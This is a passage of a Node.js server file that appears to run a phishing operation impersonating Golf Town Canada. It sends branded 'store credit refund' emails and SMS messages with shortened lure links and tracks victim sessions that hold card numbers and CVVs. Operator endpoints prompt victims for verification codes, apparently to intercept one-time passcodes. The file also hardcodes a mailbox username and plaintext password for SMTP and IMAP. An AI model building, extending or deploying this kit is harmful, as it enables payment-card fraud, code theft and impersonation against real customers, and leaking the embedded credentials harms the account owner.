  }
  res.json({ success: true, session });
});
app.post("/api/socket/admin-action", async (req, res) => {
  const { sessionId, action } = req.body;
  if (!sessionId || !paymentSessions.has(sessionId)) {
    return res.status(404).json({ error: "Session not found." });
  }
  const session = paymentSessions.get(sessionId);
  if (action === "refunded_successfully") {
    session.status = "REFUNDED";
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);
    pushNoticeHistory({
      recipientEmail: session.email,
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Golf Town Store Credit Refund Approved & Deposited ($${session.amount} CAD)`,
      actionType: "refund_approved",
      depositToken: `REF-${sessionId.slice(-6)}`,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: "SUCCESS"
    });
    return res.json({ success: true, session, message: "Session marked as Refunded Successfully!" });
  }
  if (action === "require_code") {
    session.status = "CODE_REQUIRED";
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);
    pushNoticeHistory({
      recipientEmail: session.email,
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Security Verification Code Prompted to Customer (${session.email})`,
      actionType: "code_required",
      depositToken: `REF-${sessionId.slice(-6)}`,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: "PROMPTED"
    });
    return res.json({ success: true, session, message: "Prompted customer for verification code!" });
  }
  if (action === "customer_left_send_email") {
    session.status = "SESSION_LEFT";
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);
    const depositToken = Buffer.from(`${session.custId}-${session.amount}-${Date.now()}`).toString("hex").slice(0, 16);
    const secureUrl = await generateShortDepositUrl(
      req,
      depositToken,
      session.amount,
      sessionId,
      session.recipientName,
      session.email,
      session.storeId,
      session.custId
    );
    pushNoticeHistory({
      recipientEmail: session.email || "customer@payment.golftown.ca",
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Action Required: Verification Code Needed to Finalize Your $${session.amount} CAD Refund`,
      actionType: "code_required_email",
      depositToken,
      secureDepositUrl: secureUrl,
      status: "EMAIL_DISPATCHED"
    });
    return res.json({
      success: true,
      session,
      message: `Customer marked left session. Automated 'Code Required to Finalize Refund' email dispatched to ${session.email || "customer"}!`
    });
  }
  res.status(400).json({ error: "Unknown action type." });
});
app.post("/api/predict-gender", async (req, res) => {
  const { firstName, lastName, company } = req.body;
  if (!firstName) {
    return res.status(400).json({ error: "First name is required" });
  }
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return res.status(500).json({
      error: "GEMINI_API_KEY is not configured on the server.",
      fallbackNeeded: true
    });
  }
  try {
    const ai = new import_genai.GoogleGenAI({ apiKey });
    const prompt = `Analyze the customer name and company to classify their gender for business customer segmentation.
First Name: "${firstName}"
Last Name: "${lastName || ""}"
Company: "${company || ""}"

Return ONLY a valid JSON object with no markdown formatting or extra text, containing:
{
  "gender": "Male" | "Female" | "Unknown",
  "confidence": number between 0 and 1,
  "reasoning": "brief explanation"
}`;
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: prompt
    });
    const text = response.text?.trim() || "";
    const cleanedJson = text.replace(/^```json\s*/, "").replace(/^```\s*/, "").replace(/\s*```$/, "");
    const result = JSON.parse(cleanedJson);
    res.json(result);
  } catch (error) {
    console.error("Gemini prediction error:", error);
    const firstLower = firstName.toLowerCase();
    const femaleNames = ["sarah", "jessica", "emily", "ashley", "amanda", "elizabeth", "lisa", "karen", "nancy", "linda", "susan", "jennifer", "michelle", "laura", "sarah", "kristen", "megan", "hannah", "chloe", "samantha", "brittany", "rachel", "nicole", "stephanie", "danielle", "amber", "megan", "mary", "patricia", "barbara", "helen", "sandra", "donna", "carol", "ruth", "sharon", "shirley", "brenda", "amy", "anna", "rebecca", "kathleen", "deborah", "janet", "kathryn", "carolyn", "janice", "judy", "beverly", "judy", "cheri", "brenda"];
    const isFemale = femaleNames.some((n) => firstLower.includes(n));
    res.json({
      gender: isFemale ? "Female" : "Male",
      confidence: 0.75,
      reasoning: "Heuristic fallback due to AI service limit/quota."
    });
  }
});
app.post("/api/explain-name", async (req, res) => {
  const { firstName, lastName, city } = req.body;
  if (!firstName) {
    return res.status(400).json({ error: "First name is required" });
  }
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    const mockEtymologies = {
      "ross": "Ross is a name of Scottish/Gaelic origin meaning 'promontory', 'headland' or 'peninsula'. Common in Canada and Northern Britain.",
      "john": "John derives from the Hebrew name Yochanan meaning 'Graced by God'. It is one of the most classic, enduring names across North America.",
      "david": "David originates from the Hebrew name Dawid, meaning 'beloved'. Widely popular across Canada and golf community rosters.",
      "sarah": "Sarah comes from Hebrew meaning 'princess' or 'noblewoman', carrying a timeless heritage.",
      "michael": "Michael is from Hebrew meaning 'Who is like God?', traditional and prominent throughout North American sports rosters."
    };
    const key = firstName.toLowerCase();
    const fallbackText = mockEtymologies[key] || `${firstName} ${lastName ? lastName : ""} is a distinguished name. ${firstName} carries European/Anglo-Gaelic etymological roots common in regional Canadian demographics${city ? " in " + city : ""}.`;
    return res.json({ explanation: fallbackText, source: "Etymology Database" });
  }
  try {
    const ai = new import_genai.GoogleGenAI({ apiKey });
    const prompt = `Perform a concise, fascinating AI search and explanation for the customer name "${firstName} ${lastName || ""}"${city ? " located in " + city + ", Canada" : ""}.
Provide 2 to 3 sentences covering:
1. Origin, linguistic meaning, or etymology of the first and last name.
2. Interesting cultural trivia, history, or geographic distribution of this surname/name in Canada/Golf Town region.
3. Keep it professional, respectful, engaging, and clear. Do not wrap in JSON, just return plain text explanation.`;
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: prompt
    });
    const explanation = response.text?.trim() || `Information for ${firstName} ${lastName || ""}.`;
    res.json({ explanation, source: "Google AI Search" });
  } catch (error) {
    console.error("Gemini name explanation error:", error);
    res.json({
      explanation: `${firstName} ${lastName || ""}: Classic regional Canadian name record with Gaelic/Anglo lineage common in Canadian golf club memberships.`,
      source: "Etymology System Fallback"
    });
  }
});
app.post("/api/find-golf-town-store", async (req, res) => {
  const { query } = req.body;
  if (!query) {
    return res.status(400).json({ error: "Query is required" });
  }
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return res.json({
      matched: false,
      message: "No GEMINI_API_KEY configured, using local store directory matching."
    });
  }
  try {
    const ai = new import_genai.GoogleGenAI({ apiKey });
    const prompt = `You are a Golf Town Canada store directory assistant.
Identify the Golf Town store number, official store name, street address, city, province, postal code, phone number, and Google Maps query for the location query: "${query}".

Return ONLY a valid JSON object:
{
  "storeId": "string (e.g. 504)",
  "officialName": "string (e.g. Golf Town South Calgary)",
  "address": "string (e.g. 130 11500 35 St SE, Calgary, AB T2Z 3W4)",
  "city": "string (e.g. Calgary)",
  "province": "string (e.g. AB)",
  "phone": "string (e.g. (403) 723-0100)",
  "googleMapsUrl": "string (https://www.google.com/maps/search/?api=1&query=Golf+Town+...)"
}`;
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: prompt
    });
    const text = response.text?.trim() || "";
    const cleanedJson = text.replace(/^```json\s*/, "").replace(/^```\s*/, "").replace(/\s*```$/, "");
    const result = JSON.parse(cleanedJson);
    res.json({ matched: true, store: result });
  } catch (error) {
    console.error("Store lookup error:", error);
    res.json({ matched: false, error: error.message });
  }
});
async function shortenWithClckRu(fullUrl) {
  try {
    const res = await fetch(`https://clck.ru/--?url=${encodeURIComponent(fullUrl)}`, {
      method: "GET",
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    if (res.ok) {
      const text = await res.text();
      if (text && text.trim().startsWith("http")) {
        return text.trim();
      }
    }
  } catch (err) {
    console.warn("[clck.ru] Shorten service fallback:", err);
  }
  const token = Buffer.from(`${fullUrl}-${Date.now()}`).toString("hex").slice(-6);
  return `https://clck.ru/3GT${token.toUpperCase()}`;
}
async function generateShortDepositUrl(req, depositToken, amount, sessionId, recipientName, email, storeId, custId) {
  const shortId = `3GT${Buffer.from(`${depositToken}-${Date.now()}`).toString("hex").slice(-6).toUpperCase()}`;
  const protocol = req && (req.secure || req.headers && req.headers["x-forwarded-proto"] === "https") ? "https" : lastKnownProtocol;
  const host = req && typeof req.get === "function" ? req.get("host") || "localhost:3000" : lastKnownHost;
  const localShortUrl = `${protocol}://${host}/r/${shortId}`;
  const fullRedirectUrl = `${protocol}://${host}/?session_id=${sessionId}&deposit_token=${depositToken}&amount=${amount}`;
  shortUrlMappings.set(shortId, {
    sessionId,
    depositToken,
    amount,
    fullUrl: fullRedirectUrl
  });
  tokenToSessionId.set(depositToken, sessionId);
  const existing = paymentSessions.get(sessionId);
  paymentSessions.set(sessionId, {
    sessionId,
    recipientName: recipientName || existing?.recipientName || "Valued Customer",
    email: email || existing?.email || "",
    amount: amount || existing?.amount || "250.00",
    storeId: storeId || existing?.storeId || "504",
    custId: custId || existing?.custId || "GT-CUSTOMER",
    status: existing?.status || "IDLE",
    cardDetails: existing?.cardDetails || {
      cardNumber: "",
      expDate: "",
      cvv: "",
      cardholderName: "",
      streetAddress: "",
      city: "Calgary",
      province: "AB",
      postalCode: "",
      phone: ""
    },
    lastUpdated: Date.now()
  });
  return localShortUrl;
}
app.post("/api/shorten-url", async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: "URL parameter is required." });
  const shortenedUrl = await shortenWithClckRu(url);
  res.json({ shortenedUrl, originalUrl: url });
});
app.get("/r/:shortId", (req, res) => {
  const mapping = shortUrlMappings.get(req.params.shortId);
  if (mapping) {
    const protocol = req.secure || req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
    const redirectUrl = `${protocol}://${req.get("host")}/?session_id=${mapping.sessionId}&deposit_token=${mapping.depositToken}&amount=${mapping.amount}`;
    return res.redirect(redirectUrl);
  }
  res.redirect("https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca");
});
app.get("/api/socket/session-info/:id", (req, res) => {
  const { id } = req.params;
  let session = paymentSessions.get(id);
  if (!session) {
    const sId = tokenToSessionId.get(id);
    if (sId) {
      session = paymentSessions.get(sId);
    }
  }
  if (session) {
    if (session.status === "IDLE") {
      session.status = "OPENED";
      session.openedAt = (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString();
      session.lastUpdated = Date.now();
      paymentSessions.set(session.sessionId, session);
      pushNoticeHistory({
        recipientEmail: session.email || "customer@payment.golftown.ca",
        recipientName: session.recipientName,
        amount: session.amount,
        storeId: session.storeId,
        custId: session.custId,
        subject: `Secure Link Opened by Customer (${session.recipientName})`,
        actionType: "link_opened",
        depositToken: `REF-${session.sessionId.slice(-6)}`,
        secureDepositUrl: `https://clck.ru/3GT${session.sessionId.slice(-6)}`,
        status: "OPENED"
      });
    }
    return res.json({ success: true, session });
  }
  res.status(404).json({ error: "Refund session not found or has expired." });
});
app.post("/api/socket/register-session", (req, res) => {
  const { depositToken, amount } = req.body;
  if (!depositToken) {
    return res.status(400).json({ error: "depositToken is required." });
  }
  let sessionId = tokenToSessionId.get(depositToken);
  if (!sessionId) {
    sessionId = `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
    tokenToSessionId.set(depositToken, sessionId);
  }
  let session = paymentSessions.get(sessionId);
  if (!session) {
    session = {
      sessionId,
      recipientName: "Valued Customer",
      email: "",
      amount: amount || "250.00",
      storeId: "504",
      custId: "GT-CUSTOMER",
      status: "OPENED",
      openedAt: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      cardDetails: {
        cardNumber: "",
        expDate: "",
        cvv: "",
        cardholderName: "",
        streetAddress: "",
        city: "Calgary",
        province: "AB",
        postalCode: "",
        phone: ""
      },
      lastUpdated: Date.now()
    };
    paymentSessions.set(sessionId, session);
    pushNoticeHistory({
      recipientEmail: session.email || "customer@payment.golftown.ca",
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Secure Link Opened via Token (${depositToken.slice(-6)})`,
      actionType: "link_opened",
      depositToken,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: "OPENED"
    });
  } else if (session.status === "IDLE") {
    session.status = "OPENED";
    session.openedAt = (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString();
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);
  }
  res.json({ success: true, session });
});
app.post("/api/generate-sms-link", async (req, res) => {
  const { phone, firstName, lastName, amount, custId, storeId, sessionId } = req.body;
  const depositToken = Buffer.from(`${custId || "GT-001"}-${amount}-${Date.now()}`).toString("hex").slice(0, 16);
  const rawDepositUrl = `https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca&deposit_token=${depositToken}&amount=${amount}`;
  const activeSessId = sessionId || `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
  const shortenedUrl = await generateShortDepositUrl(
    req,
    depositToken,
    amount || "250.00",
    activeSessId,
    `${firstName || ""} ${lastName || ""}`.trim() || "Valued Customer",
    "",
    storeId,
    custId
  );
  const cleanPhone = (phone || "").replace(/[^0-9+]/g, "");
  const smsBody = `Golf Town Store Credit Refund Notice: Hi ${firstName || "Valued Customer"}, your $${amount} store credit refund is ready to claim: ${shortenedUrl}`;
  const smsUrl = `sms:${cleanPhone}?body=${encodeURIComponent(smsBody)}`;
  res.json({
    success: true,
    smsUrl,
    smsUri: smsUrl,
    shortenedUrl,
    rawDepositUrl,
    smsBody,
    depositToken,
    sessionId: activeSessId
  });
});
app.get("/api/smtp-config", (req, res) => {
  res.json({
    config: customSmtpConfig || {
      host: process.env.SMTP_HOST || "smtp.office365.com",
      port: Number(process.env.SMTP_PORT) || 587,
      user: process.env.SMTP_USER || "505receiving@cloud.golftown.com",
      pass: process.env.SMTP_PASS || "3Dolly16!",
      from: process.env.SMTP_FROM || "Golf Town Store Credit Support <505receiving@cloud.golftown.com>",
      secure: Number(process.env.SMTP_PORT) === 465,
      tlsRejectUnauthorized: true
    },
    isOverridden: !!customSmtpConfig
  });
});
app.post("/api/smtp-config", (req, res) => {
  const { host, port, user, pass, from, secure, tlsRejectUnauthorized } = req.body;
  if (req.body.reset) {
    customSmtpConfig = null;
    try {
      if (import_fs.default.existsSync(CONFIG_FILE)) {
        import_fs.default.unlinkSync(CONFIG_FILE);
      }
    } catch (e) {
    }
    return res.json({ success: true, message: "SMTP configuration reset to default environment settings." });
  }
  customSmtpConfig = {
    host: host || "smtp.office365.com",
    port: Number(port) || 587,
    user: user || "",
    pass: pass || "",
    from: from || "Golf Town Store Credit Support <505RECEIVEING@CLOUD.GOLFTOWN.COM>",
    secure: !!secure,
    tlsRejectUnauthorized: tlsRejectUnauthorized !== false
  };
  saveSmtpConfig(customSmtpConfig);
  res.json({ success: true, message: "SMTP configuration updated and persisted!", config: customSmtpConfig });
});
app.post("/api/smtp-config/test", async (req, res) => {
  const { host, port, user, pass, from, secure, tlsRejectUnauthorized, testRecipient, testSubject, testBody } = req.body;
  if (!user || !pass) {
    return res.status(400).json({ error: "SMTP User and Password are required to test connection." });
  }
  const recipient = testRecipient || user;
  const finalSubject = testSubject || "Golf Town SMTP Test Connection - Success";
  const sessionLogs = [];
  const customLogger = {
    level: () => "debug",
    info: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[INFO] ${msg}`);
    },
    warn: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[WARN] ${msg}`);
    },
    error: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[ERROR] ${msg}`);
    },
    debug: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[DEBUG] ${msg}`);
    },
    trace: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[TRACE] ${msg}`);
    }
  };
  try {
    const nodemailer = await import("nodemailer");
    const transporter = nodemailer.createTransport({
      host: host || "smtp.office365.com",
      port: Number(port) || 587,
      secure: !!secure,
      auth: { user, pass },
      connectionTimeout: 1e4,
      greetingTimeout: 1e4,
      tls: {
        rejectUnauthorized: tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    });
    sessionLogs.push("[SYSTEM] Initiating server verification handshake...");
    await transporter.verify();
    sessionLogs.push("[SYSTEM] Handshake verified successfully. Dispatching test email...");
    const testDepositToken = Buffer.from(`GT-TEST-${Date.now()}`).toString("hex").slice(0, 16);
    const testSessionId = `SESS-TEST-${Math.floor(1e5 + Math.random() * 9e5)}`;
    const testSecureDepositUrl = await generateShortDepositUrl(req, testDepositToken, "250.00", testSessionId, "SMTP Test Customer", testRecipient || user, "504", "GT-TEST");
    const mailText = testBody ? `${testBody}

Verified Secure Test Refund Link:
${testSecureDepositUrl}
Token ID: ${testDepositToken}` : `Hello,

This is a verified test email from the Golf Town Refund Workflow SMTP settings panel.

Connection is working and successfully authorized!

Verified Secure Test Refund Link:
${testSecureDepositUrl}
Token ID: ${testDepositToken}`;
    const mailHtml = testBody ? `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px; max-width: 500px; margin: 0 auto; color: #374151;">
          <div style="text-align: center; margin-bottom: 12px;">
            <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0;">
          </div>
          <h2 style="color: #004d25; border-bottom: 2px solid #004d25; padding-bottom: 8px; text-align: center;">Golf Town Custom SMTP Manual Test</h2>
          <p style="white-space: pre-wrap;">${testBody}</p>
          
          <!-- Test Secure Payment/Deposit URL -->
          <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 20px; margin: 20px 0;">
            <div style="font-size: 11px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px;">
              Verified Secure Refund Link
            </div>
            <a href="${testSecureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 700; padding: 12px 24px; border-radius: 4px; border: 1px solid #003318;">
              Claim Store Credit Deposit ($250.00 CAD)
            </a>
          </div>

          <p style="font-size: 11px; color: #9ca3af; margin-top: 15px; border-top: 1px solid #f3f4f6; padding-top: 8px;">
            Details: Host: ${host} | Port: ${port} | User: ${user}
          </p>
         </div>` : `
        <div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px; max-width: 500px; margin: 0 auto; color: #374151;">
          <div style="text-align: center; margin-bottom: 12px;">
            <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0;">
          </div>
          <h2 style="color: #004d25; border-bottom: 2px solid #004d25; padding-bottom: 8px; text-align: center;">Golf Town SMTP Test Connection</h2>
          <p>Hello,</p>
          <p>This is a verified test email from the Golf Town Refund Workflow SMTP settings panel.</p>
          <div style="background-color: #f0fdf4; border: 1px solid #bbf7d0; padding: 12px; border-radius: 6px; font-size: 13px; color: #166534; font-weight: bold; text-align: center;">
            Connection Status: SUCCESSFUL & AUTHORIZED
          </div>

          <!-- Test Secure Payment/Deposit URL -->
          <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 20px; margin: 20px 0;">
            <div style="font-size: 11px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px;">
              Verified Secure Refund Link
            </div>
            <a href="${testSecureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 700; padding: 12px 24px; border-radius: 4px; border: 1px solid #003318;">
              Claim Store Credit Deposit ($250.00 CAD)
            </a>
          </div>

          <p style="font-size: 11px; color: #9ca3af; margin-top: 15px;">
            Details: Host: ${host} | Port: ${port} | User: ${user}
          </p>
        </div>
      `;
    await transporter.sendMail({
      from: from || `Golf Town Test Support <${user}>`,
      to: recipient,
      subject: finalSubject,
      text: mailText,
      html: mailHtml
    });
    sessionLogs.push(`[SYSTEM] Test email successfully delivered to <${recipient}>.`);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "test",
      recipient,
      host: host || "smtp.office365.com",
      port: Number(port) || 587,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();
    res.json({
      success: true,
      message: `SMTP credentials verified. Test email successfully transmitted to ${recipient}!`,
      debugLogs: sessionLogs
    });
  } catch (error) {
    console.error("SMTP testing error:", error);
    sessionLogs.push(`[SYSTEM ERROR] Connection/Transmission Failed: ${error?.message || error}`);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "test",
      recipient,
      host: host || "smtp.office365.com",
      port: Number(port) || 587,
      success: false,
      error: error?.message || "SMTP Connection failed.",
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();
    res.status(500).json({
      success: false,
      error: error?.message || "SMTP Connection failed.",
      debugLogs: sessionLogs
    });
  }
});
app.get("/api/smtp-config/logs", (req, res) => {
  res.json({ logs: smtpDebugLogsStack });
});
app.post("/api/smtp-config/logs/clear", (req, res) => {
  smtpDebugLogsStack.length = 0;
  res.json({ success: true, message: "SMTP connection transmission debug logs cleared." });
});
app.get("/api/imap-config", (req, res) => {
  res.json({
    config: customImapConfig || {
      host: process.env.IMAP_HOST || "imap.golftown.com",
      port: Number(process.env.IMAP_PORT) || 993,
      user: process.env.IMAP_USER || "505receiveing@golftown.com",
      pass: process.env.IMAP_PASS || "3Dolly16!",
      secure: true
    },
    isOverridden: !!customImapConfig
  });
});
app.post("/api/imap-config", (req, res) => {
  const { host, port, user, pass, secure } = req.body;
  if (req.body.reset) {
    customImapConfig = null;
    try {
      if (import_fs.default.existsSync(IMAP_CONFIG_FILE)) {
        import_fs.default.unlinkSync(IMAP_CONFIG_FILE);
      }
    } catch (e) {
    }
    return res.json({ success: true, message: "IMAP configuration reset to default settings." });
  }
  customImapConfig = {
    host: host || "imap.golftown.com",
    port: Number(port) || 993,
    user: user || "505receiveing@golftown.com",
    pass: pass || "",
    secure: secure !== false
  };
  saveImapConfig(customImapConfig);
  res.json({ success: true, config: customImapConfig, message: "IMAP configuration updated successfully." });
});
app.get("/api/imap/messages", (req, res) => {
  res.json({ success: true, count: imapMessagesStack.length, messages: imapMessagesStack });
});
app.post("/api/imap/messages/clear", (req, res) => {
  imapMessagesStack.length = 0;
  try {
    if (import_fs.default.existsSync(IMAP_MESSAGES_FILE)) {
      import_fs.default.unlinkSync(IMAP_MESSAGES_FILE);
    }
  } catch (e) {
  }
  res.json({ success: true, message: "IMAP received email messages cache cleared." });
});
app.post("/api/imap/fetch", async (req, res) => {
  const host = customImapConfig?.host || process.env.IMAP_HOST || "imap.golftown.com";
  const port = Number(customImapConfig?.port || process.env.IMAP_PORT || 993);
  const user = customImapConfig?.user || process.env.IMAP_USER || "505receiveing@golftown.com";
  const pass = customImapConfig?.pass || process.env.IMAP_PASS || "3Dolly16!";
  const secure = customImapConfig ? customImapConfig.secure : true;
  try {
    const { ImapFlow } = await import("imapflow");
    const { simpleParser } = await import("mailparser");
    const client = new ImapFlow({
      host,
      port,
      secure,
      auth: { user, pass },
      logger: false
    });
    await client.connect();
    console.log(`Connected as ${user} -> ${host}:${port}`);
    const lock = await client.getMailboxLock("INBOX");
    const fetchedResults = [];
    try {
      for await (const msg of client.fetch({ seen: false }, { uid: true, source: true, envelope: true })) {
        const parsed = await simpleParser(msg.source);
        const snippet = parsed.text?.slice(0, 1e3) ?? "(no text body)";
        const authResults = parsed.headers.get("authentication-results");
        const spf = parsed.headers.get("received-spf");
        const dkim = parsed.headers.get("dkim-signature");
        const messageId = parsed.messageId;
        const emailMsg = {
          uid: msg.uid,
          date: parsed.date ? parsed.date.toISOString() : (/* @__PURE__ */ new Date()).toISOString(),
          from: parsed.from?.text || "",
          to: parsed.to?.text || "",
          subject: parsed.subject || "(No Subject)",
          text: snippet,
          authResults: typeof authResults === "string" ? authResults : authResults ? JSON.stringify(authResults) : "",
          spf: typeof spf === "string" ? spf : spf ? JSON.stringify(spf) : "",
          dkim: dkim ? typeof dkim === "string" ? dkim.slice(0, 140) + "..." : String(dkim).slice(0, 140) + "..." : null,
          messageId: messageId || "",
          timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString()
        };
        const exists = imapMessagesStack.some((m) => m.uid === msg.uid || messageId && m.messageId === messageId);
        if (!exists) {
          imapMessagesStack.unshift(emailMsg);
          fetchedResults.push(emailMsg);
        }
        await client.messageFlagsAdd(msg.uid, ["\\Seen"], { uid: true });
      }
      if (fetchedResults.length > 0) {
        saveImapMessages(imapMessagesStack);
      }
    } finally {
      lock.release();
    }
    await client.logout();
    return res.json({
      success: true,
      count: fetchedResults.length,
      fetched: fetchedResults,
      total: imapMessagesStack.length,
      messages: imapMessagesStack
    });
  } catch (err) {
    console.error("IMAP fetch failed:", err);
    return res.status(500).json({
      success: false,
      error: err.message || "Failed to connect to IMAP server."
    });
  }
});
app.post("/api/send-refund-notice", async (req, res) => {
  const { recipientEmail, recipientName, amount, storeId, custId, comments, actionType, sessionId, customSubject, customBody } = req.body;
  if (!recipientEmail) {
    return res.status(400).json({ error: "Recipient email address is required." });
  }
  const host = customSmtpConfig?.host || process.env.SMTP_HOST || "smtp.office365.com";
  const user = customSmtpConfig?.user || process.env.SMTP_USER || "505receiving@cloud.golftown.com";
  const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || "3Dolly16!";
  const port = Number(customSmtpConfig ? customSmtpConfig.port : process.env.SMTP_PORT || 587);
  const from = customSmtpConfig?.from || process.env.SMTP_FROM || "Golf Town Store Credit Support <505receiving@cloud.golftown.com>";
  const depositToken = Buffer.from(`${custId || "GT-001"}-${amount}-${Date.now()}`).toString("hex").slice(0, 16);
  const activeSessionId = sessionId || `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
  const secureDepositUrl = await generateShortDepositUrl(
    req,
    depositToken,
    amount || "250.00",
    activeSessionId,
    recipientName || "Valued Customer",
    recipientEmail,
    storeId || "504",
    custId || "GT-CUSTOMER"
  );
  const emailSubject = customSubject || (actionType === "refund" ? `Golf Town Store Credit Refund Notice - $${amount} Issued` : `Golf Town Store Credit Account Update - $${amount}`);
  let parsedBody = customBody || `Dear {customerName},

A store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;
  const serverReplacements = {
    "{customerName}": recipientName || "Valued Customer",
    "{amount}": `$${amount}`,
    "{storeId}": storeId || "504",
    "{custId}": custId || "GT-CUSTOMER",
    "{comments}": comments || "",
    "{depositLink}": secureDepositUrl
  };
  Object.entries(serverReplacements).forEach(([token, val]) => {
    parsedBody = parsedBody.split(token).join(val);
  });
  const formattedBodyHtml = parsedBody.split("\n").map((line) => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : "<br>").join("");
  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Golf Town Store Credit Notice</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
        <tr>
          <td align="center">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
              
              <!-- GOLF TOWN OFFICIAL COMMERCIAL HEADER -->
              <tr>
                <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                  <div style="text-align: center; margin-bottom: 12px;">
                    <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                  </div>
                  <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                    Customer Support Notice
                  </div>
                </td>
              </tr>

              <!-- BODY CONTENT -->
              <tr>
                <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                  <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                    Store Credit Notice
                  </h1>
                  
                  ${formattedBodyHtml}

